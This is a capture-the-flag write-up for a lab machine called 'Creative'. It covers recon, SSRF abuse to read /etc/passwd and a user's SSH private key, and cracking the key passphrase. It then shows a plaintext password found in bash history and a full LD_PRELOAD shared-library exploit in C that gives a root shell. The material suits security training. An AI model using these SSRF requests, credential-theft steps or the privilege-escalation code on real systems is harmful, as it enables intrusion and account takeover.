![creative](creative.png)

<br>

![recon1](recon1.png)
## Debugging Contents 
```bash
$ curl -sI 10.10.82.1
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Redacted
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://creative.thm
```
```bash
$ curl -v creative.thm 
* Host creative.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.82.1
*   Trying 10.10.82.1:80...
* Connected to creative.thm (10.10.82.1) port 80
> GET / HTTP/1.1
> Host: creative.thm
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Redacted
< Content-Type: text/html
< Content-Length: 37589
< Last-Modified: Fri, 16 Aug 2019 01:38:36 GMT
< Connection: keep-alive
< ETag: "5d56091c-92d5"
< Accept-Ranges: bytes
< 
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Creative Studio landing page.">
    <meta name="author" content="Devcrud">
    <title>Creative Studio | Free Bootstrap 4.3.x template</title>

    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">

    <!-- Bootstrap + Creative Studio main styles -->
	<link rel="stylesheet" href="assets/css/creative-studio.css">

</head>
...
...
```
## Adding Host 
```bash
$ echo "10.10.82.1 creative.thm" | tee -a /etc/hosts 
```
## Nmap Enumeration
> Service detection
```bash
$ nmap -sC -sV -p$(nmap --min-rate=2000 -T4 -p- 10.10.82.1 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.82.1 -oN tcp.txt 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                      
```

## Subdomain Enumeration
```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm/ -H 'Host: FUZZ.creative.thm' -fw 6 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 282ms]
:: Progress: [4989/4989] :: Job [1/1] :: 144 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
```bash 
$ echo 10.10.82.1 creative.thm beta.creative.thm | tee -a /etc/hosts
```
## Checking Subdomain 
```bash
$ curl -sI beta.creative.thm 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Redacted
Content-Type: text/html; charset=utf-8
Content-Length: 591
Connection: keep-alive
Content-Disposition: inline; filename=index.html
Last-Modified: Fri, 20 Jan 2023 12:49:49 GMT
Cache-Control: no-cache
ETag: "1674218989.3719935-591-3795258644"
```
## File Enumeration 
```bash
$ feroxbuster -u http://creative.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt --scan-dir-listings 
                                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://creative.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404  GET  Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200  GET  http://creative.thm/assets/vendors/bootstrap/bootstrap.affix.js
200  GET  http://creative.thm/assets/imgs/avatar-5.jpg
200  GET  http://creative.thm/assets/imgs/folio-6.jpg
200  GET  http://creative.thm/assets/imgs/folio-1.jpg
200  GET  http://creative.thm/assets/imgs/blog-2.jpg
200  GET  http://creative.thm/assets/vendors/themify-icons/css/themify-icons.css
200  GET  http://creative.thm/assets/imgs/avatar-1.jpg
200  GET  http://creative.thm/assets/imgs/avatar-3.jpg
200  GET  http://creative.thm/components.html
200  GET  http://creative.thm/assets/js/creative-studio.js
200  GET  http://creative.thm/assets/imgs/logo.png
200  GET  http://creative.thm/assets/imgs/avatar-4.jpg
200  GET  http://creative.thm/assets/imgs/avatar.jpg
403  GET  http://creative.thm/assets/imgs/
403  GET  http://creative.thm/assets/css/
200  GET  http://creative.thm/assets/imgs/avatar-6.jpg
200  GET  http://creative.thm/assets/imgs/avatar-2.jpg
200  GET  http://creative.thm/assets/imgs/folio-2.jpg
403  GET  http://creative.thm/assets/vendors/
200  GET  http://creative.thm/assets/imgs/blog-1.jpg
200  GET  http://creative.thm/assets/imgs/folio-3.jpg
200  GET  http://creative.thm/assets/imgs/blog-3.jpg
403  GET  http://creative.thm/assets/vendors/bootstrap/
200  GET  http://creative.thm/assets/imgs/folio-5.jpg
403  GET  http://creative.thm/assets/js/
403  GET  http://creative.thm/assets/
403  GET  http://creative.thm/assets/vendors/themify-icons/
403  GET  http://creative.thm/assets/vendors/jquery/
200  GET  http://creative.thm/assets/imgs/about.jpg
200  GET  http://creative.thm/assets/imgs/folio-4.jpg
200  GET  http://creative.thm/assets/vendors/bootstrap/bootstrap.bundle.js
200  GET  http://creative.thm/assets/vendors/jquery/jquery-3.4.1.js
200  GET  http://creative.thm/assets/css/creative-studio.css
200  GET  http://creative.thm/
301  GET  http://creative.thm/assets => http://creative.thm/assets/
301  GET  http://creative.thm/assets/vendors/themify-icons/css => http://creative.thm/assets/vendors/themify-icons/css/
301  GET  http://creative.thm/assets/css => http://creative.thm/assets/css/
301  GET  http://creative.thm/assets/vendors/themify-icons/fonts => http://creative.thm/assets/vendors/themify-icons/fonts/
301  GET  http://creative.thm/assets/imgs => http://creative.thm/assets/imgs/
301  GET  http://creative.thm/assets/vendors/jquery => http://creative.thm/assets/vendors/jquery/
301  GET  http://creative.thm/assets/js => http://creative.thm/assets/js/
301  GET  http://creative.thm/assets/vendors => http://creative.thm/assets/vendors/

```
## Checking submit request 
> found a URL submit form that can ping my own IP or host, an indication of potential vulnerabilities in the application. 
![responce](response.png)
![parameter](parameter.png)

## Possible vulnerabilities
- **SSRF** 
- **Command Injection** 
- **LFI**
- **SQL Injection**
- **XSS** 

## Checking SSRF 
```bash
$ python3 ssrfmap.py -r /home/kali/creative/requests.txt -p url -m portscan
 _____ _________________                     
/  ___/  ___| ___ \  ___|                    
\ `--.\ `--.| |_/ / |_ _ __ ___   __ _ _ __  
 `--. \`--. \    /|  _| '_ ` _ \ / _` | '_ \ 
/\__/ /\__/ / |\ \| | | | | | | | (_| | |_) |
\____/\____/\_| \_\_| |_| |_| |_|\__,_| .__/ 
                                      | |    
                                      |_|    
[INFO]:Module 'portscan' launched !
	[13:30:30] IP:127.0.0.1   , Found open      port n°80                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°23                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°21                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°443                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°22                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°3389                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°25                    
	[13:30:30] IP:127.0.0.1   , Found filtered  port n°110
	[13:30:31] IP:127.0.0.1   , Found filtered  port n°445                    
	[13:30:31] IP:127.0.0.1   , Found filtered  port n°143                    
	[13:30:31] IP:127.0.0.1   , Found filtered  port n°139                    
	[13:30:31] IP:127.0.0.1   , Found filtered  port n°135
...
...             
```
## Fuzzing Internal services 
```bash
$ for port in $(seq 80 65355); do echo $port; done > ports.txt

$ cat ports.txt | wc -l 
65276
```
> Found internal service
```bash
$ ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm/
 :: Wordlist         : FUZZ: /home/kali/creative/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 279ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 281ms]
```
![Internal](internal.png)
## Checking users
```bash
$ curl -X POST "http://beta.creative.thm" -d "url=http://127.0.0.1:1337/etc/passwd" --output -  

root:x:0:0:root:/root:/bin/bash
saad:x:1000:1000:saad:/home/saad:/bin/bash
...
...                                                        
```
```bash
$ curl -X POST "http://beta.creative.thm" -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" --output id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe
wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs
48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6
LzfUwwv9QZXMujHpExowWuwlEKBYiPeEK7mGvS0jJLsaEpQorZNvUhrUO4frSQA6/OTmXE
d/hMX2910cAiCa5NlgBn4nH8y5bjSrygFUSVJiMBVUY0H77mj6gmJUoz5jv96fV+rBaFoB
LGOy00gbX+2YTzBIJsKwOG97Q3HMnMKH+vCL09h/i3nQodWdqLP73U0PK2pu/nUFvGE8ju
nkkRVNqqO5m0eYfdkWHLKz13JzohUBBsLrtj6c9hc8CIqErf5B573RKdhu4gy4JkCMEW1D
xKhNWu+TI3VME1Q0ThJII/TMCR+Ih+/IDwgVTaW0LJR6Cn5nZzUHBLjkDV66vJRYN/3dJ5
{REDACTED}
e+gtkwODGaGQpUl793Eusk6vVYZni5xgOMDuERsREuT2ZsUP20AxVYw/mbUsOjeGpEoCGZ
UBwl2LeGGSDZgZJC+DLOj/Rg0uy9gaADI0Nrwz6ushxqFUg1RDV+WzFxIw9uDqFiL0gHwZ
FXiQLzmLQZ5X1JtWD2nqZwPnM66q9wOeMstYw8+8mJz5E/lTr80Nsde/eVYs3sY9STF+Ye
421hF21P2RLOYv4UM2aQ2hmfUb9MJ99Rj5UvpY83z4uUYu7Vmq2dMDcFsk7Zg8JdNDMg2O
GpgYRcLH44/iPrKRKdtdlVXILLKLjFau8TPzyhKfsa6/3H485Sc/YT94D+bRcx3uL+U003
l7H2rPQ2RDPQeRyLX12uRMcakQLY7zIEyFhH0fMw3rCTcdp/FbkOUEOfXBPkSNWHh7f411
15y/K7bkNDwSi5Ul9yt05uSSEsibJVSfKbvETEFmSQ3tdSVq0PA3ymiBzWixlNOE123KI0
Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs
fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+6
D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/6+sWRpg7H5jkNz
69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E
8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP
nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od
Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----

```
## Cracking Hash
```bash
$ ssh2john id_rsa > id_rsa.hash
```
```bash
$ sudo john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
...
sweet***        (id_rsa)     
...
...
Session completed.                  
```
## Initial Access
```bash
$ chmod 600 id_rsa 

$ ssh -i id_rsa saad@creative.thm 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
...
...
saad@m4lware:~$ 

```

## User Flag
```bash
9a1ce90a76{redacted}98630b47b8b4a84
```
## Password History
> found in linpeas results
```bash
/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```
# Privilege Escalation
## Possible Privilege vector 
```bash
# owner daemon  
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

# We didn't find ping in GTFObins
-rwxr-xr-x 1 root root 72776 Jan 30  2020 /usr/bin/ping 

# found environment variable `LD_PRELOAD` Shared Library 
env_keep+=LD_PRELOAD
```

## Checking Sudoers 
```bash
saad@m4lware:~$ sudo -l 
[sudo] password for saad: 

Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
saad@m4lware:~$ 
``` 
## Gaining root - (Overriding Shared Library)
> [Shared Library - ExploitNotes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/) 
```c
// under tmp directory create file exploit.c  

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```
```bash 
# compiling exploit.c 
saad@m4lware:/tmp$ gcc  -fPIC -shared -o exploit.so exploit.c

# executing exploit.so
saad@m4lware:~$ sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/ping 
```
```bash
root@m4lware:/home/saad# id

uid=0(root) gid=0(root) groups=0(root)

root@m4lware:~# cat root.txt 
992bfd94b9{redactred}4aed182aae7b99f

```
